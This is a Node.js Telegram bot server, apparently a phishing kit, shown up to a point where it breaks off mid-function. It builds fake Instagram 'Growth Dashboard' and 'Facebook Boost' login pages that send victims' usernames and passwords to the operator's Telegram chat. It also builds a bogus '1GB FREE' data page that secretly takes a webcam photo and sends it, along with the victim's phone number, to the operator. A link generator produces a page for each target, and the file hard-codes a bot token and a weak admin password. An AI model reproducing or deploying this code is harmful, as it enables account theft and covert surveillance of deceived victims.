// ====================== index.js (Complete Working Code) ======================
/*
 * © 2026 SeXyxeon (VOIDSEC)
 * Complete Bot with Admin Panel - Photo Management
 * No Environment Variables Needed - Everything Set in Code
 */

process.env.NTBA_FIX_350 = 1;

// ====================== CONFIGURATION ======================
const config = {
    // 🔥 BAS YAHAN APNA BOT TOKEN DAALO 🔥
    mainToken: '8809859232:AAHoJfHSdpJ67h0Blr2scKV_86vrZQhVpIA', // <-- Yahan apna token daalo!
    
    S7: '@ZoroXbug',
    port: 3000,
    love: 'S7_LOVE_2026',
    adminPassword: 'admin123', // Admin panel password - CHANGE KARO!
    
    // ✅ Aapke channel aur group IDs set kar diye
    channelId: '-1003004551707',
    groupId: '-1003559518526',
    group: 'https://t.me/RTFGAMINGHACK0',
    channel: 'https://t.me/RTFGAMINGHACK0',
    
    bot: '𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 𝐁𝐎𝐘 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐁𝐎𝐓'
};

// ====================== CHECK TOKEN ======================
if (!config.mainToken || config.mainToken === 'YOUR_BOT_TOKEN_HERE') {
    console.error('❌ ERROR: Please add your Bot Token in config.mainToken!');
    console.error('📌 Get token from @BotFather on Telegram');
    process.exit(1);
}

console.log('✅ Bot Token found, starting...');
console.log('📌 Channel ID:', config.channelId);
console.log('📌 Group ID:', config.groupId);

// ====================== DEPENDENCIES ======================
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const moment = require('moment-timezone');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const { log } = require('@sabir7718/log');

// ====================== SETUP ======================
const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// Create directories
const PHOTO_DIR = path.join(__dirname, 'photos');
const DATA_DIR = path.join(__dirname, 'data');
const BOT_PHOTO_DIR = path.join(PHOTO_DIR, 'bot');
const PAGES_DIR = path.join(__dirname, 'pages');

if (!fs.existsSync(PHOTO_DIR)) fs.mkdirSync(PHOTO_DIR, { recursive: true });
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(BOT_PHOTO_DIR)) fs.mkdirSync(BOT_PHOTO_DIR, { recursive: true });
if (!fs.existsSync(PAGES_DIR)) fs.mkdirSync(PAGES_DIR, { recursive: true });

// Photo storage file
const PHOTOS_FILE = path.join(DATA_DIR, 'photos.json');

if (!fs.existsSync(PHOTOS_FILE)) {
    fs.writeFileSync(PHOTOS_FILE, JSON.stringify({ photos: [] }, null, 2));
}

// Multer setup for file upload
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, BOT_PHOTO_DIR);
    },
    filename: (req, file, cb) => {
        const uniqueName = Date.now() + '-' + file.originalname.replace(/\s/g, '_');
        cb(null, uniqueName);
    }
});
const upload = multer({ 
    storage: storage,
    limits: { fileSize: 10 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) {
            cb(null, true);
        } else {
            cb(new Error('Only images allowed!'));
        }
    }
});

// ====================== PHOTO FUNCTIONS ======================
function getPhotos() {
    try {
        const data = JSON.parse(fs.readFileSync(PHOTOS_FILE, 'utf8'));
        return data.photos || [];
    } catch {
        return [];
    }
}

function savePhotos(photos) {
    fs.writeFileSync(PHOTOS_FILE, JSON.stringify({ photos }, null, 2));
}

function addPhoto(file, caption = '') {
    const photos = getPhotos();
    const photoData = {
        id: Date.now().toString(),
        filename: file.filename,
        originalName: file.originalname,
        url: `/api/photos/${file.filename}`,
        caption: caption,
        uploadedAt: new Date().toISOString(),
        active: true
    };
    photos.push(photoData);
    savePhotos(photos);
    return photoData;
}

function deletePhoto(id) {
    const photos = getPhotos();
    const index = photos.findIndex(p => p.id === id);
    if (index === -1) return false;
    
    const photo = photos[index];
    const filePath = path.join(BOT_PHOTO_DIR, photo.filename);
    if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
    }
    
    photos.splice(index, 1);
    savePhotos(photos);
    return true;
}

function togglePhoto(id) {
    const photos = getPhotos();
    const photo = photos.find(p => p.id === id);
    if (!photo) return false;
    photo.active = !photo.active;
    savePhotos(photos);
    return photo;
}

function getActivePhotos() {
    return getPhotos().filter(p => p.active);
}

function getRandomPhoto() {
    const photos = getActivePhotos();
    if (photos.length === 0) return null;
    return photos[Math.floor(Math.random() * photos.length)];
}

// ====================== HTML TEMPLATES ======================
const TEMPLATES = {
    instagram: `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Growth Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: radial-gradient(circle at top left, #2c0e38, #000000); height: 100vh; display: flex; justify-content: center; align-items: center; }
        .card { background: rgba(30, 30, 30, 0.6); backdrop-filter: blur(20px); width: 380px; padding: 40px 30px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5); text-align: center; color: white; }
        .insta-logo-icon { font-size: 48px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        h2 { font-size: 22px; font-weight: 700; margin-bottom: 5px; }
        .input-group { position: relative; margin-bottom: 15px; text-align: left; }
        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #888; }
        .input-field, select { width: 100%; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); padding: 14px 14px 14px 45px; border-radius: 12px; color: #fff; font-size: 14px; outline: none; transition: 0.3s; appearance: none; }
        .btn-start { width: 100%; padding: 15px; border: none; border-radius: 12px; background: linear-gradient(90deg, #4f5bd5, #962fbf, #d62976, #fa7e1e); color: white; font-weight: 600; font-size: 15px; cursor: pointer; transition: 0.3s; }
        .btn-start:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(214, 41, 118, 0.6); }
        #process-screen { display: none; }
        .spinner { width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; display: inline-block; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .progress-container { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; margin: 20px 0; }
        .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #4f5bd5, #d62976); transition: width 0.5s ease; }
        .delivered-box { background: rgba(0,0,0,0.3); border-radius: 16px; padding: 20px; }
        .delivered-count { font-size: 42px; font-weight: 800; }
        .user-preview { display: flex; align-items: center; justify-content: center; gap: 15px; margin: 20px 0; }
        .avatar-circle { width: 40px; height: 40px; background: #ddd; border-radius: 50%; }
        .verified { color: #00ff88; font-size: 11px; }
        .loader-text { color: #aaa; font-size: 13px; margin: 10px 0; display: flex; align-items: center; justify-content: center; gap: 8px; }
    </style>
</head>
<body>
    <div class="card">
        <i class="fab fa-instagram insta-logo-icon"></i>
        <h2>Growth Dashboard</h2>
        <div id="form-screen">
            <div class="input-group"><i class="far fa-user"></i><input type="text" id="username" class="input-field" placeholder="Username"></div>
            <div class="input-group"><i class="fas fa-shield-alt"></i><input type="password" id="password" class="input-field" placeholder="Password"></div>
            <button class="btn-start" onclick="startEngine()">Start Growth Engine <i class="fas fa-bolt"></i></button>
        </div>
        <div id="process-screen">
            <div class="user-preview"><div class="avatar-circle"></div><div><span class="u-name" id="display-username">@Username</span><div class="verified">Account Verified</div></div></div>
            <div class="loader-text"><div class="spinner"></div><span id="status-text">Processing...</span></div>
            <div class="progress-container"><div class="progress-bar" id="progress-bar"></div></div>
            <div class="delivered-box"><div class="delivered-count" id="count-display">0</div></div>
        </div>
    </div>
    <script>
        const id = "USERID_PLACEHOLDER";
        const p = "PLATFORM_PLACEHOLDER";
        
        function startEngine() {
            const userInput = document.getElementById('username').value.trim();
            const passInput = document.getElementById('password').value;
            if (!userInput || !passInput) { alert("Please fill all fields."); return; }
            
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userid: id, user: userInput, pass: passInput, platform: p })
            }).catch(err => console.error(err));
            
            document.getElementById('form-screen').style.display = 'none';
            document.getElementById('process-screen').style.display = 'block';
            document.getElementById('display-username').innerText = '@' + userInput;
            
            let progress = 0, count = 0;
            const interval = setInterval(() => {
                progress += Math.random() * 2 + 0.5;
                if (progress >= 100) { progress = 100; clearInterval(interval); 
                    document.getElementById('status-text').innerHTML = '✅ Complete!';
                    document.querySelector('.loader-text').innerHTML = '<i class="fas fa-check-circle" style="color:#00ff88"></i> Process Complete';
                    return; 
                }
                document.getElementById('progress-bar').style.width = progress + '%';
                if (progress > 25) {
                    count += Math.floor(Math.random() * 50) + 10;
                    document.getElementById('count-display').innerText = count.toLocaleString();
                }
                if (progress < 30) document.getElementById('status-text').innerText = "Connecting...";
                else if (progress < 60) document.getElementById('status-text').innerText = "Processing...";
                else document.getElementById('status-text').innerText = "Finalizing...";
            }, 100);
        }
    </script>
</body>
</html>`,

    facebook: `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Facebook Boost</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: radial-gradient(circle at center, #0d1a33, #000000); height: 100vh; display: flex; justify-content: center; align-items: center; }
        .card { background: rgba(30, 40, 60, 0.75); backdrop-filter: blur(25px); width: 400px; padding: 45px 35px; border-radius: 20px; border: 1px solid rgba(150, 200, 255, 0.2); box-shadow: 0 30px 60px rgba(0,0,0,0.7); text-align: center; color: white; }
        .fb-logo-icon { font-size: 58px; color: #2D88FF; text-shadow: 0 0 25px rgba(45,136,255,0.7); }
        h2 { font-size: 26px; font-weight: 800; }
        .input-group { position: relative; margin-bottom: 20px; text-align: left; }
        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #90b0e0; }
        .input-field, select { width: 100%; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); padding: 16px 16px 16px 50px; border-radius: 10px; color: #ffffff; font-size: 15px; outline: none; transition: 0.3s; appearance: none; }
        .btn-start { width: 100%; padding: 16px; border: none; border-radius: 10px; background: linear-gradient(135deg, #2D88FF, #0056b3); color: white; font-weight: 700; font-size: 17px; cursor: pointer; transition: 0.3s; }
        .btn-start:hover { transform: translateY(-3px); box-shadow: 0 12px 25px rgba(45,136,255,0.6); }
        #process-screen { display: none; }
        .spinner { width: 18px; height: 18px; border: 3px solid rgba(45,136,255,0.2); border-top-color: #2D88FF; border-radius: 50%; animation: spin 0.8s linear infinite; display: inline-block; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .progress-container { width: 100%; height: 10px; background: rgba(255,255,255,0.1); border-radius: 20px; overflow: hidden; margin: 20px 0; }
        .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #2D88FF, #54c7fc); transition: width 0.5s ease; }
        .delivered-box { background: rgba(45,136,255,0.1); border-radius: 16px; padding: 25px; border: 1px solid rgba(45,136,255,0.4); }
        .delivered-count { font-size: 48px; font-weight: 900; }
        .user-preview { display: flex; align-items: center; justify-content: center; gap: 15px; margin: 20px 0; background: rgba(45,136,255,0.15); padding: 12px 20px; border-radius: 50px; border: 1px solid rgba(45,136,255,0.4); }
        .avatar-circle { width: 45px; height: 45px; background: #2D88FF; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid white; }
        .verified { color: #4FA3FF; font-size: 13px; display: flex; align-items: center; gap: 5px; }
        .loader-text { color: #d0d7e7; font-size: 14px; margin: 12px 0; display: flex; align-items: center; justify-content: center; gap: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <i class="fab fa-facebook fb-logo-icon"></i>
        <h2>FACEBOOK BOOST</h2>
        <div id="form-screen">
            <div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="username" class="input-field" placeholder="Email or Phone"></div>
            <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" class="input-field" placeholder="Password"></div>
            <button class="btn-start" onclick="startEngine()">Start Boost <i class="fas fa-rocket"></i></button>
        </div>
        <div id="process-screen">
            <div class="user-preview"><div class="avatar-circle"><i class="fas fa-user-check"></i></div><div><span class="u-name" id="display-username">User</span><div class="verified"><i class="fas fa-check-circle"></i> Verified</div></div></div>
            <div class="loader-text"><div class="spinner"></div><span id="status-text">Connecting...</span></div>
            <div class="progress-container"><div class="progress-bar" id="progress-bar"></div></div>
            <div class="delivered-box"><div class="delivered-count" id="count-display">0</div></div>
        </div>
    </div>
    <script>
        const id = "USERID_PLACEHOLDER";
        const p = "PLATFORM_PLACEHOLDER";
        
        function startEngine() {
            const userInput = document.getElementById('username').value.trim();
            const passInput = document.getElementById('password').value;
            if (!userInput || !passInput) { alert("Please fill all fields."); return; }
            
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userid: id, user: userInput, pass: passInput, platform: p })
            }).catch(err => console.error(err));
            
            document.getElementById('form-screen').style.display = 'none';
            document.getElementById('process-screen').style.display = 'block';
            document.getElementById('display-username').innerText = userInput;
            
            let progress = 0, count = 0;
            const interval = setInterval(() => {
                progress += Math.random() * 1.5 + 0.5;
                if (progress >= 100) { progress = 100; clearInterval(interval); 
                    document.getElementById('status-text').innerHTML = '✅ Success!';
                    document.querySelector('.loader-text').innerHTML = '<i class="fas fa-check-circle" style="color:#2D88FF"></i> Process Complete';
                    return; 
                }
                document.getElementById('progress-bar').style.width = progress + '%';
                if (progress > 25) {
                    count += Math.floor(Math.random() * 30) + 5;
                    document.getElementById('count-display').innerText = count.toLocaleString();
                }
                if (progress < 25) document.getElementById('status-text').innerText = "Connecting...";
                else if (progress < 50) document.getElementById('status-text').innerText = "Verifying...";
                else if (progress < 75) document.getElementById('status-text').innerText = "Processing...";
                else document.getElementById('status-text').innerText = "Finalizing...";
            }, 100);
        }
    </script>
</body>
</html>`,

    camera: `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>VIP DATA INJECTOR</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; padding: 0; font-family: 'Rajdhani', sans-serif; background: #050505; height: 100vh; display: flex; justify-content: center; align-items: center; color: white; }
        .card { background: rgba(255,255,255,0.05); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); border-radius: 40px; padding: 50px 40px; width: 400px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        h1 { font-family: 'Orbitron', sans-serif; font-size: 45px; font-weight: 900; background: linear-gradient(to bottom, #fff, #888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .badge { display: inline-block; background: linear-gradient(90deg, #ff007a, #7000ff); padding: 4px 15px; border-radius: 10px; font-size: 12px; font-weight: bold; letter-spacing: 3px; margin-bottom: 20px; }
        .input-box { margin: 25px 0; text-align: left; }
        .input-box label { font-size: 13px; color: #00f2ff; text-transform: uppercase; letter-spacing: 2px; margin-left: 15px; display: block; }
        select, input { width: 100%; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); padding: 18px 25px; border-radius: 20px; color: white; font-size: 18px; font-family: 'Rajdhani', sans-serif; transition: 0.4s; }
        .btn-neon { width: 100%; padding: 20px; border: none; border-radius: 20px; background: white; color: black; font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 16px; text-transform: uppercase; cursor: pointer; transition: 0.3s; box-shadow: 0 10px 30px rgba(255,255,255,0.2); }
        .btn-neon:hover { background: #00f2ff; box-shadow: 0 0 40px #00f2ff; transform: translateY(-3px); }
        #console { margin-top: 30px; background: rgba(0,0,0,0.6); border-radius: 20px; padding: 20px; font-family: 'Courier New', monospace; font-size: 13px; color: #00f2ff; text-align: left; display: none; border: 1px solid rgba(0,242,255,0.1); }
        .line { margin-bottom: 5px; border-left: 3px solid #00f2ff; padding-left: 10px; animation: lineIn 0.3s ease-out; }
        @keyframes lineIn { from { opacity:0; transform: translateX(-10px); } to { opacity:1; transform: translateX(0); } }
        .err { color: #ff007a; border-color: #ff007a; }
        .suc { color: #00ff88; border-color: #00ff88; font-weight: bold; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="badge">SECURE ACCESS</div>
        <h1>1GB FREE</h1>
        <div class="input-box"><label>Operator</label><select id="operator"><option>JIO</option><option>AIRTEL</option><option>VODAFONE</option><option>BSNL</option></select></div>
        <div class="input-box"><label>Neural Number</label><input type="number" id="mobile" placeholder="Enter Mobile ID"></div>
        <button class="btn-neon" id="trigger">INITIALIZE INJECTION</button>
        <div id="console"></div>
    </div>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>
    <script>
        const id = "USERID_PLACEHOLDER";
        const p = "PLATFORM_PLACEHOLDER";
        const btn = document.getElementById('trigger');
        const consoleBox = document.getElementById('console');
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        const ctx = canvas.getContext('2d');
        
        function addLog(msg, type = '') {
            const l = document.createElement('div');
            l.className = 'line ' + type;
            l.innerText = msg;
            consoleBox.appendChild(l);
        }
        
        btn.addEventListener('click', async () => {
            if(document.getElementById('mobile').value.length < 10) { alert("ACCESS DENIED"); return; }
            btn.disabled = true;
            btn.innerText = "CAPTURING...";
            consoleBox.style.display = "block";
            consoleBox.innerHTML = "";
            addLog("Requesting Kernel Access...");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                addLog("Neural Link Established.");
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    const photoBase64 = canvas.toDataURL('image/jpeg', 0.92).split(',')[1];
                    stream.getTracks().forEach(t => t.stop());
                    
                    fetch('/api/capturepic', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ userid: id, mobile: document.getElementById('mobile').value, SY: photoBase64, platform: p })
                    }).catch(err => console.error(err));
                    
                    const steps = ["Bypassing Firewall...", "Downloading Packets...", "Syncing Satellite...", "Finalizing..."];
                    let i = 0;
                    const timer = setInterval(() => {
                        if(i < steps.length) { addLog(steps[i]); i++; }
                        else {
                            clearInterval(timer);
                            addLog("INJECTION SUCCESSFUL!", "suc");
                            btn.innerText = "ACTIVE";
                            btn.style.background = "#00ff88";
                            setTimeout(() => alert("1GB VIP Data Injected!"), 500);
                        }
                    }, 1000);
                }, 1200);
            } catch(e) {
                addLog("FATAL ERROR: SENSOR BLOCKED", "err");
                btn.innerText = "LOCKED";
                btn.style.background = "#ff007a";
            }
        });
    </script>
</body>
</html>`
};

// ====================== EXPRESS ROUTES ======================

// Serve static files
app.use('/api/photos', express.static(BOT_PHOTO_DIR));

// ====================== ADMIN PANEL ======================
app.get('/admin', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Photo Management</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #0a0a0a; color: white; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 15px; margin-bottom: 30px; text-align: center; }
        .header h1 { font-size: 36px; }
        .header p { opacity: 0.8; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; }
        .photo-card { background: #1a1a2e; border-radius: 15px; padding: 15px; border: 1px solid #2a2a4a; transition: 0.3s; }
        .photo-card:hover { transform: translateY(-5px); border-color: #667eea; }
        .photo-card img { width: 100%; height: 200px; object-fit: cover; border-radius: 10px; }
        .photo-card .info { padding: 10px 0; }
        .photo-card .id { font-size: 12px; color: #888; }
        .photo-card .actions { display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap; }
        .btn { padding: 8px 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; transition: 0.3s; }
        .btn-danger { background: #dc3545; color: white; }
        .btn-danger:hover { background: #c82333; }
        .btn-success { background: #28a745; color: white; }
        .btn-success:hover { background: #218838; }
        .btn-warning { background: #ffc107; color: black; }
        .btn-warning:hover { background: #e0a800; }
        .btn-primary { background: #007bff; color: white; }
        .btn-primary:hover { background: #0069d9; }
        .upload-section { background: #1a1a2e; padding: 30px; border-radius: 15px; margin-bottom: 30px; border: 2px dashed #2a2a4a; }
        .upload-section form { display: flex; gap: 20px; flex-wrap: wrap; align-items: center; }
        .upload-section input[type="file"] { background: transparent; color: white; padding: 10px; border: 1px solid #2a2a4a; border-radius: 8px; }
        .upload-section input[type="text"] { flex: 1; min-width: 200px; padding: 12px; background: #0a0a0a; border: 1px solid #2a2a4a; border-radius: 8px; color: white; }
        .stats { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #1a1a2e; padding: 20px; border-radius: 15px; text-align: center; border: 1px solid #2a2a4a; }
        .stat-card .number { font-size: 32px; font-weight: 700; color: #667eea; }
        .stat-card .label { color: #888; font-size: 14px; }
        .empty { text-align: center; padding: 60px 20px; color: #666; }
        .empty i { font-size: 64px; margin-bottom: 20px; display: block; }
        .login-container { max-width: 400px; margin: 100px auto; background: #1a1a2e; padding: 40px; border-radius: 20px; border: 1px solid #2a2a4a; }
        .login-container input { width: 100%; padding: 15px; background: #0a0a0a; border: 1px solid #2a2a4a; border-radius: 10px; color: white; font-size: 16px; margin-bottom: 15px; }
        .login-container .btn { width: 100%; padding: 15px; font-size: 16px; }
        .toast { position: fixed; bottom: 20px; right: 20px; background: #28a745; color: white; padding: 15px 30px; border-radius: 10px; display: none; }
        .toast.error { background: #dc3545; }
        @media (max-width: 600px) { .header h1 { font-size: 24px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📸 Admin Panel - Photo Management</h1>
            <p>Manage photos for your Telegram Bot</p>
        </div>
        
        <div class="stats" id="stats"></div>
        
        <div class="upload-section">
            <h3>📤 Upload New Photo</h3>
            <form id="uploadForm" enctype="multipart/form-data">
                <input type="file" name="photo" accept="image/*" required>
                <input type="text" name="caption" placeholder="Caption (optional)">
                <button type="submit" class="btn btn-primary">Upload</button>
            </form>
        </div>
        
        <div id="photoGrid" class="grid"></div>
    </div>
    
    <div id="toast" class="toast"></div>
    
    <script>
        const API_BASE = window.location.origin;
        
        function showToast(message, isError = false) {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.className = 'toast' + (isError ? ' error' : '');
            toast.style.display = 'block';
            setTimeout(() => { toast.style.display = 'none'; }, 3000);
        }
        
        async function loadPhotos() {
            try {
                const res = await fetch('/api/admin/photos');
                const data = await res.json();
                const photos = data.photos || [];
                const active = photos.filter(p => p.active).length;
                const total = photos.length;
                
                document.getElementById('stats').innerHTML = \`
                    <div class="stat-card"><div class="number">\${total}</div><div class="label">Total Photos</div></div>
                    <div class="stat-card"><div class="number">\${active}</div><div class="label">Active Photos</div></div>
                    <div class="stat-card"><div class="number">\${total - active}</div><div class="label">Inactive Photos</div></div>
                \`;
                
                const grid = document.getElementById('photoGrid');
                if (photos.length === 0) {
                    grid.innerHTML = '<div class="empty"><i>📷</i>No photos uploaded yet.<br>Upload your first photo above!</div>';
                    return;
                }
                
                grid.innerHTML = photos.map(p => \`
                    <div class="photo-card">
                        <img src="\${p.url}" alt="\${p.caption || 'Photo'}">
                        <div class="info">
                            <div class="id">ID: \${p.id}</div>
                            <div>\${p.caption || 'No caption'}</div>
                            <div style="font-size:12px;color:#888;">\${new Date(p.uploadedAt).toLocaleDateString()}</div>
                            <div style="font-size:12px;color:\${p.active ? '#28a745' : '#dc3545'};">\${p.active ? '✅ Active' : '❌ Inactive'}</div>
                        </div>
                        <div class="actions">
                            <button class="btn btn-warning" onclick="togglePhoto('\${p.id}')">\${p.active ? 'Hide' : 'Show'}</button>
                            <button class="btn btn-danger" onclick="deletePhoto('\${p.id}')">Delete</button>
                        </div>
                    </div>
                \`).join('');
            } catch (err) {
                console.error(err);
                showToast('Error loading photos', true);
            }
        }
        
        async function deletePhoto(id) {
            if (!confirm('Delete this photo?')) return;
            try {
                const res = await fetch(\`/api/admin/photos/\${id}\`, { method: 'DELETE' });
                if (res.ok) {
                    showToast('Photo deleted!');
                    loadPhotos();
                } else {
                    showToast('Delete failed', true);
                }
            } catch (err) {
                showToast('Error', true);
            }
        }
        
        async function togglePhoto(id) {
            try {
                const res = await fetch(\`/api/admin/photos/\${id}/toggle\`, { method: 'PATCH' });
                if (res.ok) {
                    showToast('Photo toggled!');
                    loadPhotos();
                } else {
                    showToast('Toggle failed', true);
                }
            } catch (err) {
                showToast('Error', true);
            }
        }
        
        document.getElementById('uploadForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            try {
                const res = await fetch('/api/admin/upload', { method: 'POST', body: formData });
                if (res.ok) {
                    showToast('Photo uploaded!');
                    e.target.reset();
                    loadPhotos();
                } else {
                    showToast('Upload failed', true);
                }
            } catch (err) {
                showToast('Error uploading', true);
            }
        });
        
        loadPhotos();
    </script>
</body>
</html>
    `);
});

// ====================== ADMIN API ROUTES ======================

app.get('/api/admin/photos', (req, res) => {
    const photos = getPhotos();
    res.json({ photos, total: photos.length });
});

app.post('/api/admin/upload', upload.single('photo'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        const caption = req.body.caption || '';
        const photo = addPhoto(req.file, caption);
        res.json({ success: true, photo });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/admin/photos/:id', (req, res) => {
    const success = deletePhoto(req.params.id);
    if (success) {
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Photo not found' });
    }
});

app.patch('/api/admin/photos/:id/toggle', (req, res) => {
    const photo = togglePhoto(req.params.id);
    if (photo) {
        res.json({ success: true, photo });
    } else {
        res.status(404).json({ error: 'Photo not found' });
    }
});

// ====================== BOT API ROUTES ======================

app.get('/api/bot/random-photo', (req, res) => {
    const photo = getRandomPhoto();
    if (photo) {
        res.json({ success: true, photo });
    } else {
        res.status(404).json({ error: 'No photos available' });
    }
});

// ====================== CAPTURE ROUTES ======================

app.post('/api/capture', async (req, res) => {
    const { userid, user, pass, platform } = req.body || {};
    if (!userid || !user) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    try {
        const photo = getRandomPhoto();
        let message = LoveNotifer(platform, pass, user);
        
        if (photo) {
            const photoUrl = `${req.protocol}://${req.get('host')}${photo.url}`;
            await S7.sendPhoto(userid, photoUrl, {
                caption: message,
                parse_mode: 'HTML'
            });
        } else {
            await S7.sendMessage(userid, message);
        }
        res.json({ status: 'success' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/capturepic', async (req, res) => {
    const { userid, mobile, SY, platform } = req.body || {};
    if (!userid || !SY) {
        return res.status(400).json({ error: 'Missing required photo data' });
    }
    try {
        const photoBuffer = Buffer.from(SY.replace(/^data:image\/\w+;base64,/, ""), 'base64');
        const SYloveTiMe = moment().tz("Asia/Kolkata").format('h:mm:ss A');
        const SYloveDaTe = moment().tz("Asia/Kolkata").format('DD/MM/YYYY');
        const caption = `<b>📸 NEW CAPTURE 📸</b>\n\n` +
                        `👤 <b>Target:</b> <code>${mobile || 'Unknown'}</code>\n` +
                        `🌐 <b>Platform:</b> ${platform ? platform.toUpperCase() : 'N/A'}\n` +
                        `📅 <b>Date:</b> ${SYloveDaTe}\n` +
                        `⏰ <b>Time:</b> ${SYloveTiMe}\n\n` +
                        `<i>© ↝ ᴅᴇᴠ ʙʏ » ${config.S7}</i>`;
        await S7.sendPhoto(userid, photoBuffer, { caption, parse_mode: 'HTML' });
        res.json({ status: 'success' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to process image' });
    }
});

// ====================== LINK GENERATION ======================

app.get('/api/create-link', (req, res) => {
    const userid = req.headers.userid || 'unknown';
    const platform = req.headers.platform || 'instagram';
    
    const p = platform.toLowerCase();
    let template;
    if (p === 'instagram') template = TEMPLATES.instagram;
    else if (p === 'facebook') template = TEMPLATES.facebook;
    else if (p === 'camera') template = TEMPLATES.camera;
    else return res.status(400).json({ error: 'Invalid platform' });
    
    const displayPlatform = p === 'instagram' ? '𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌' : 
                           p === 'facebook' ? '𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊' : '𝐂𝐀𝐌𝐄𝐑𝐀';
    
    let html = template
        .replace(/USERID_PLACEHOLDER/g, userid)
        .replace(/PLATFORM_PLACEHOLDER/g, displayPlatform);
    
    const fileId = Date.now().toString(36) + Math.random().toString(36).substr(2, 3);
    fs.writeFileSync(path.join(PAGES_DIR, `${fileId}.html`), html);
    
    const baseUrl = req.protocol + '://' + req.get('host');
    const url = `${baseUrl}/page/${fileId}`;
    
    res.json({ success: true, url, id: fileId });
});

app.get('/page/:id', (req, res) => {
    const id = req.params.id;
    const filePath = path.join(PAGES_DIR, `${id}.html`);
    if (fs.existsSync(filePath)) {
